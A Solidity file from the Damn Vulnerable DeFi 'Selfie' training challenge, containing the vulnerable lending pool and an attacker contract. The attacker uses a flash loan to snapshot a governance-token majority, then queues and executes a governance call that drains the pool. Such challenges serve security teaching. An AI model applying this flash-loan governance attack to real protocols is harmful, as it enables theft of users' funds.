// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}

import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfiePool {
    // take flashLoan and create a snapshot of DVT token 
    // then queue drainFunds as action as we have more than half of supply and return the flashLoan
    // for _canBeExecuted() to be true pass 2 days, then call executeAction

    DamnValuableTokenSnapshot public governanceToken;
    SelfiePool public lenderPool;  
    SimpleGovernance public governance;
    uint256 private actionId;

    constructor(address _governanceTokenAddress, address _lenderPool, address _governanceAddress) {
        governanceToken = DamnValuableTokenSnapshot(_governanceTokenAddress);
        lenderPool = SelfiePool(_lenderPool);
        governance = SimpleGovernance(_governanceAddress);
    }

    function exploitQueueAction() public returns(uint256) {
        lenderPool.flashLoan(governanceToken.balanceOf(address(lenderPool)));
        // queue Action and save actionId
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", msg.sender);
        actionId = governance.queueAction(address(lenderPool), data, 0);
        return actionId;
    }

    function executeAction() public {
        governance.executeAction(actionId);
    }

    fallback() external payable {
        governanceToken.snapshot();
        governanceToken.transfer(address(lenderPool), governanceToken.balanceOf(address(this)));
    }

    receive() external payable {}

}
